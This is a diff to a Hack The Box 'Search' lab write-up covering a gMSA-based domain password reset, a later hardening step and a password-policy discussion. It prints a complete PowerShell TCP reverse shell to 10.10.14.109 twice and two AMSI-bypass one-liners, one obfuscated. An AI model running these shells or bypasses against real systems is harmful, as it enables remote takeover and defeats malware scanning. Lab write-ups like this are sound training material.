@@ -294,7 +294,7 @@ ConvertFrom-ADManagedPasswordBlob $gmsaPass
 
 ```powershell
 $credobj = ConvertFrom-ADManagedPasswordBlob $gmsaPass
-$credobj.SecureCurrentPassword
+$credobj.SecureCurrentPassword # just for visual purposes
 $credential = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $credobj.SecureCurrentPassword
 # Now we can invoke command
 Invoke-Command -Computername localhost -Credential $credential -Scriptblock { net user TRISTAN.DAVIES password123! /domain }
@@ -302,7 +302,40 @@ Invoke-Command -Computername localhost -Credential $credential -Scriptblock { ne
 
 ![](tristandaviesyourface.png)
 
+
+
 ![](hurray.png)
+
+After some playing around with fancy options I went to copy and paste powershell
+```powershell
+$username = 'Tristan.Davies'
+$password = 'password123!'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Invoke-Command -Computername localhost -Credential $credential -Scriptblock { powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" }
+```
+Greeted by:
+![](bingbongbingbongAMSI.png)
+I did run cme module `enum_avproducts`, but it just errored out - and these failed
+```powershell
+[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)
+
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."AssEmbly"."GETTYPe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."getfiElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sETVaLUE"( ${nULl},${tRuE} )
+```
+Yikes...
+![](wearegettingslapped.png)
+
+Pre Root Extras for persistence and fun:
+- Dumped ntds with cme!
+
+Listed for trying on next Beyond Root
+- Failed to use a cme to get a shell 
+- Enabling RDP with cme and impacket kerboros tickets 
+	- Harden and or implement AMSI with powershell 
+- Create an alert based on .exe and .ps1 from PowerUP, Winpeas 
+- Remote interaction with box that would no lead to compromise
+- Open RDP for a new user to use Sysmon, ProcMon
+- Get Sysinternals on box
 
 ## Beyond Root
 
@@ -312,12 +345,36 @@ Returning the next day for the Beyond Root.
 `impacket-smbpasswd` - https://github.com/fortra/impacket/blob/master/examples/smbpasswd.py
 
       
-Harden the box with powershell
-	- Research hardening, but do atleast (prior to research):
-		- Lock down port connectivity per user - check connectivity group 
-		- Harden and or implement AMSI with powershell
-		- Configure the password policy 
-		- Create an alert based on .exe and .ps1 from PowerUP, Winpeas 
-		- Remote interaction with box that would no lead to compromise
-		- Open RDP for a new user to use Sysmon, ProcMon
-		- Get Sysinternals on box
+Harden the box with powershell - Research hardening, but do atleast (prior to research):
+- Lock down port connectivity per user - check connectivity group
+- Harden and or implement AMSI with powershell - Do not need to added to list of todos
+- Configure the password policy 
+```powershell
+Get-ADDefaultDomainPasswordPolicy
+```
+![](passwordpolicy.png)
+
+Microsoft guidelines
+![](mspasswordguidelines.png)
+
+Forgive the hurried desire to do the beyond root rather add to endless reading. [UK government's Password advice](https://www.ncsc.gov.uk/collection/passwords/updating-your-approach) has alot of nuanced advice poniting out similiar issues making it too complex for users that the burden result in less secure password storage or strength [discussed in this Sans article](https://www.sans.org/blog/the-debate-around-password-rotation-policies).
+[US governments Password tips](https://www.cisa.gov/uscert/ncas/tips/ST04-002) more precise do x, French CLI says atleast 12 letter, German - long and complex and Israel Cyber Chef's "pants" advise - do not reuse and do not share is good memorable advise for regular users.
+
+So I did:
+```powershell
+Set-ADDefaultDomainPasswordPolicy -Identity search.htb -PasswordHistoryCount 10 -MinPasswordLength 12 -ComplexityEnabled $true
+```
+
+
+## Additional Writeup Read
+
+https://0xdf.gitlab.io/2022/04/30/htb-search.html
+
+[Ippsec](https://www.youtube.com/watch?v=c8Qbloh6Lqg)
+1. Change variable names
+2. Find the trigger
+```powershell
+Invoke-Command -Computername localhost -Credential $credential -Scriptblock { $client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
+```
+
+![](tristanrev1.png)
